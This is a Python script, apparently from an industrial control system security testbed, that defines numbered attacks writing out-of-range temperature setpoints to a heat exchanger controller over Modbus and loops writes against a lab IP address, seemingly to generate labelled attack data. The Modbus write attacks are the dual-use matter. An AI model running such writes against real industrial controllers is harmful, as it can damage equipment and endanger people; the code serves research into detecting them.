#!/bin/python3

"""
Created on Tue Mar 10 15:43:48 2020

@author: Rishabh Das


Please include change_data_label(label) function call before doing each attack
This function call lets the data logger know that some kind of attack is
being performed on the system.

"""
import socket
import threading
import pickle
import time
from HeatExchangerModbusUtility import HeatExchangerModbusUtility

MODBUS_PKT_SIZE=55

class attack:

    def __init__(self, ip, port):
        self.he = HeatExchangerModbusUtility( ip )

    def Attack18( self ):
        # #18 -- Set the value of setpoint below 20C
        self.he.WriteRegister( "Setpoint", 10 )

    def Attack19( self ):
        # #19 -- Set the value of setpoint above 70C
        self.he.WriteRegister( "Setpoint", 80 )

    def Attack20( self ):
        # #20 -- Set the value of setpoint to 26C
        self.he.WriteRegister( "Setpoint", 26 )

    def Attack21( self ):
        # #21 -- Set the value of setpoint to zero
        self.he.WriteRegister( "Setpoint", 0 )

if __name__=="__main__":
    attacker = attack( "192.168.56.104", "502" )
    attacker.he.PrintAllRegisters()
    while True:

        attacker.he.WriteRegister( "Setpoint", 70 )
